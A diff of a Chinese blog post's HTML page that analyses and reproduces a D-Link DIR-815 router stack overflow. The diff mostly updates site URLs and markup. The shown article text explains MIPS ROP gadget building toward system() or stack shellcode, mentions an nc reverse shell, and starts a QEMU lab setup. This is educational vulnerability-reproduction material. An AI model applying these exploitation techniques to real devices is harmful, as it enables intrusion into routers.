@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>DLink 815路由器栈溢出漏洞分析与复现 - Ghostasky&#39;s Blog</title><meta name="author" content="">
+    <title>DLink 815路由器栈溢出漏洞分析与复现 - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
 <meta name="author-link" content="">
-<meta name="description" content="" /><meta name="keywords" content='漏洞复现' /><meta itemprop="name" content="DLink 815路由器栈溢出漏洞分析与复现">
-<meta itemprop="description" content=""><meta itemprop="datePublished" content="2022-10-23T00:00:00+00:00" />
+<meta name="description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，" /><meta name="keywords" content='漏洞复现' /><meta itemprop="name" content="DLink 815路由器栈溢出漏洞分析与复现">
+<meta itemprop="description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，"><meta itemprop="datePublished" content="2022-10-23T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2022-10-23T00:00:00+00:00" />
-<meta itemprop="wordCount" content="2931">
+<meta itemprop="wordCount" content="2935">
 <meta itemprop="keywords" content="漏洞复现," /><meta property="og:title" content="DLink 815路由器栈溢出漏洞分析与复现" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/dir815/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/dir815/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-10-23T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-10-23T00:00:00+00:00" />
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="DLink 815路由器栈溢出漏洞分析与复现"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="没玩过IOT，搞个简单的分析下 踩了非常多的坑，光环境就搞了好久，，QAQ MIPS架构特性 叶子函数与非叶子函数 叶子函数：函数内没有调用其他函数，返回地址直接在$ra寄存器中2 非叶子函数：函数内调用其他函数，返回地址$ra首先通过sw放入栈中，"/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/dir815/" /><link rel="prev" href="http://localhost:1313/posts/2022-9-wincode1/" /><link rel="next" href="http://localhost:1313/posts/2023-1-winkernel%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/dir815/" /><link rel="prev" href="http://ghostasky.github.io/posts/2022-9-wincode1/" /><link rel="next" href="http://ghostasky.github.io/posts/2023-1-winkernel%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
@@ -32,20 +32,20 @@
     "inLanguage": "zh-CN",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http:\/\/localhost:1313\/posts\/dir815\/"
-    },"genre": "posts","keywords": "漏洞复现","wordcount":  2931 ,
-    "url": "http:\/\/localhost:1313\/posts\/dir815\/","datePublished": "2022-10-23T00:00:00+00:00","dateModified": "2022-10-23T00:00:00+00:00","publisher": {
+      "@id": "http:\/\/ghostasky.github.io\/posts\/dir815\/"
+    },"genre": "posts","keywords": "漏洞复现","wordcount":  2935 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/dir815\/","datePublished": "2022-10-23T00:00:00+00:00","dateModified": "2022-10-23T00:00:00+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
-        "name": "作者"
+        "name": "Ghostasky"
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
-      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
               <a
@@ -80,7 +80,7 @@
   <div class="header-container">
     <div class="header-wrapper">
       <div class="header-title">
-        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
       <div class="menu-toggle" id="menu-toggle-mobile">
         <span></span><span></span><span></span>
       </div>
@@ -124,8 +124,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>DLink 815路由器栈溢出漏洞分析与复现</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2022-10-23 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-10-23">2022-10-23</time></span>&nbsp;<span title="2931 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3000 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2022-10-23 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-10-23">2022-10-23</time></span>&nbsp;<span title="2935 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3000 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -154,21 +153,33 @@
 </nav></div>
       </div><div class="content" id="content"><p>没玩过IOT，搞个简单的分析下</p>
 <p>踩了非常多的坑，光环境就搞了好久，，QAQ</p>
-<h2 id="mips架构特性" class="heading-element">
-  <a href="#mips%e6%9e%b6%e6%9e%84%e7%89%b9%e6%80%a7" class="heading-mark"></a>MIPS架构特性</h2><h3 id="叶子函数与非叶子函数" class="heading-element">
-  <a href="#%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0%e4%b8%8e%e9%9d%9e%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0" class="heading-mark"></a>叶子函数与非叶子函数</h3><ul>
+<h2 id="mips架构特性" class="heading-element"><span>MIPS架构特性</span>
+  <a href="#mips%e6%9e%b6%e6%9e%84%e7%89%b9%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="叶子函数与非叶子函数" class="heading-element"><span>叶子函数与非叶子函数</span>
+  <a href="#%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0%e4%b8%8e%e9%9d%9e%e5%8f%b6%e5%ad%90%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
 <li>叶子函数：函数内没有调用其他函数，返回地址直接在<code>$ra</code>寄存器中2</li>
 <li>非叶子函数：函数内调用其他函数，返回地址<code>$ra</code>首先通过<code>sw</code>放入栈中，之后返回时使用<code>lw</code>取出返回</li>
 </ul>
 <p>不只是<code>$ra</code>，其他寄存器如果使用到了的话也会放入栈中，比如<code>$s0 ~ $s7，$fp</code></p>
 <p><code>$s0 ~ $s7, $fp, $ra</code>在栈中是由低到高放的，所以写payload的时候可以顺带控制</p>
 <p><img loading="lazy" src="/posts/dir815/image-20221023001551632.png" alt="image-20221023001551632" srcset="/posts/dir815/image-20221023001551632.png?size=small, /posts/dir815/image-20221023001551632.png?size=medium 1.5x, /posts/dir815/image-20221023001551632.png?size=large 2x" data-title="image-20221023001551632" style="--width: 1028px;--aspect-ratio: 1028 / 434;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h3 id="流水线效应" class="heading-element">
-  <a href="#%e6%b5%81%e6%b0%b4%e7%ba%bf%e6%95%88%e5%ba%94" class="heading-mark"></a>流水线效应</h3><p>常见的就是跳转指令，比如在没跳转之前，跳转指令的下一条指令(分支延迟槽)先执行，之后在跳转指令执行。</p>
+<h3 id="流水线效应" class="heading-element"><span>流水线效应</span>
+  <a href="#%e6%b5%81%e6%b0%b4%e7%ba%bf%e6%95%88%e5%ba%94" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>常见的就是跳转指令，比如在没跳转之前，跳转指令的下一条指令(分支延迟槽)先执行，之后在跳转指令执行。</p>
 <p>还有缓存不一致的问题，比如指令缓存器和数据缓存器，两者需要一个时间来同步，所以需要sleep，最好还是sleep一下。</p>
-<h3 id="跳到某个函数的rop构造" class="heading-element">
-  <a href="#%e8%b7%b3%e5%88%b0%e6%9f%90%e4%b8%aa%e5%87%bd%e6%95%b0%e7%9a%84rop%e6%9e%84%e9%80%a0" class="heading-mark"></a>跳到某个函数的ROP构造</h3><p>system函数：</p>
-<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00053200</span>                 <span class="nf">li</span>      <span class="no">$gp</span><span class="p">,</span> <span class="p">(</span><span class="no">_GLOBAL_OFFSET_TABLE_</span><span class="err">+</span><span class="mi">0x7FF0</span> <span class="p">-</span> <span class="p">.)</span>  <span class="c1"># Alternative name is &#39;__libc_system&#39;
+<h3 id="跳到某个函数的rop构造" class="heading-element"><span>跳到某个函数的ROP构造</span>
+  <a href="#%e8%b7%b3%e5%88%b0%e6%9f%90%e4%b8%aa%e5%87%bd%e6%95%b0%e7%9a%84rop%e6%9e%84%e9%80%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>system函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00053200</span>                 <span class="nf">li</span>      <span class="no">$gp</span><span class="p">,</span> <span class="p">(</span><span class="no">_GLOBAL_OFFSET_TABLE_</span><span class="err">+</span><span class="mi">0x7FF0</span> <span class="p">-</span> <span class="p">.)</span>  <span class="c1"># Alternative name is &#39;__libc_system&#39;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00053208</span>                 <span class="nf">addu</span>    <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>
 </span></span><span class="line"><span class="cl"><span class="na">..........</span>
 </span></span><span class="line"><span class="cl"><span class="na">..........</span>
@@ -178,19 +189,28 @@
 <p>最后返回的时候是<code>$ra</code>寄存器，就是说跳到这个函数前就要写好<code>$ra</code>寄存器，一般<code>move $t9,xxx</code>这种指令后会有<code>lw $ra,xxx; jr $t9</code></p>
 <p>可以直接：<code>mipsrop.tail()</code>寻找gadget</p>
 <p><img loading="lazy" src="/posts/dir815/image-20221023170945604.png" alt="image-20221023170945604" srcset="/posts/dir815/image-20221023170945604.png?size=small, /posts/dir815/image-20221023170945604.png?size=medium 1.5x, /posts/dir815/image-20221023170945604.png?size=large 2x" data-title="image-20221023170945604" style="--width: 1489px;--aspect-ratio: 1489 / 801;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h3 id="跳到shellcode的rop链构造" class="heading-element">
-  <a href="#%e8%b7%b3%e5%88%b0shellcode%e7%9a%84rop%e9%93%be%e6%9e%84%e9%80%a0" class="heading-mark"></a>跳到shellcode的ROP链构造</h3><p>mips一般都是栈溢出的同时将shellcode放到栈上，之后跳过去执行。得到shellcode的地址的话，可以使用如<code>addiu $s0, $sp, xxx</code>然后<code>move $t9, $s0 ; jalr $t9</code>跳过去，可以直接<code>mipsrop.stackfinder()</code></p>
+<h3 id="跳到shellcode的rop链构造" class="heading-element"><span>跳到shellcode的ROP链构造</span>
+  <a href="#%e8%b7%b3%e5%88%b0shellcode%e7%9a%84rop%e9%93%be%e6%9e%84%e9%80%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>mips一般都是栈溢出的同时将shellcode放到栈上，之后跳过去执行。得到shellcode的地址的话，可以使用如<code>addiu $s0, $sp, xxx</code>然后<code>move $t9, $s0 ; jalr $t9</code>跳过去，可以直接<code>mipsrop.stackfinder()</code></p>
 <p><img loading="lazy" src="/posts/dir815/image-20221023171343705.png" alt="image-20221023171343705" srcset="/posts/dir815/image-20221023171343705.png?size=small, /posts/dir815/image-20221023171343705.png?size=medium 1.5x, /posts/dir815/image-20221023171343705.png?size=large 2x" data-title="image-20221023171343705" style="--width: 1546px;--aspect-ratio: 1546 / 750;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h3 id="systemcmd的gadget" class="heading-element">
-  <a href="#systemcmd%e7%9a%84gadget" class="heading-mark"></a>system(cmd)的gadget</h3><p>这里会用到nc反弹shell的命令。</p>
+<h3 id="systemcmd的gadget" class="heading-element"><span>system(cmd)的gadget</span>
+  <a href="#systemcmd%e7%9a%84gadget" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这里会用到nc反弹shell的命令。</p>
 <p>system的参数在<code>$a0</code>中，可以使用类似<code>addiu $s0, $sp, xxx ;move $a0, $s0</code>来实现，mempcpy函数会有上述的gadget：</p>
 <p>由于流水线特性 ，跳过去之前<code>$a0</code>就已经给<code>$s2</code>了</p>
-<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B6C</span>                 <span class="no">addiu</span>   <span class="no">$s2</span><span class="p">,</span> <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x280</span><span class="err">+</span><span class="no">var_268</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B6C</span>                 <span class="no">addiu</span>   <span class="no">$s2</span><span class="p">,</span> <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x280</span><span class="err">+</span><span class="no">var_268</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B70</span>                 <span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$v1</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B74</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$s0</span>
 </span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B78</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c1">; mempcpy
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B7C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$s2</span></span></span></code></pre></div><h2 id="环境搭建" class="heading-element">
-  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark"></a>环境搭建</h2><p>首先是binwalk，提取</p>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00015</span><span class="nf">B7C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$s2</span></span></span></code></pre></div><h2 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>首先是binwalk，提取</p>
 <p><img loading="lazy" src="/posts/dir815/image-20221021163527135.png" alt="image-20221021163527135" srcset="/posts/dir815/image-20221021163527135.png?size=small, /posts/dir815/image-20221021163527135.png?size=medium 1.5x, /posts/dir815/image-20221021163527135.png?size=large 2x" data-title="image-20221021163527135" style="--width: 1549px;--aspect-ratio: 1549 / 608;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>32位MIPS小端</p>
 <p><a href="https://people.debian.org/~aurel32/qemu/mipsel/"target="_blank" rel="external nofollow noopener noreferrer">https://people.debian.org/~aurel32/qemu/mipsel/</a></p>
@@ -200,7 +220,7 @@
 <li><code>vmlinux-3.2.0-4-4kc-malta</code>是内核镜像</li>
 </ul>
 <p>qemu启动脚本：</p>
-<div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo qemu-system-mipsel <span class="se">\
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo qemu-system-mipsel <span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>-M malta <span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>-kernel vmlinux-3.2.0-4-4kc-malta <span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>-hda debian_squeeze_mipsel_standard.qcow2 <span class="se">\
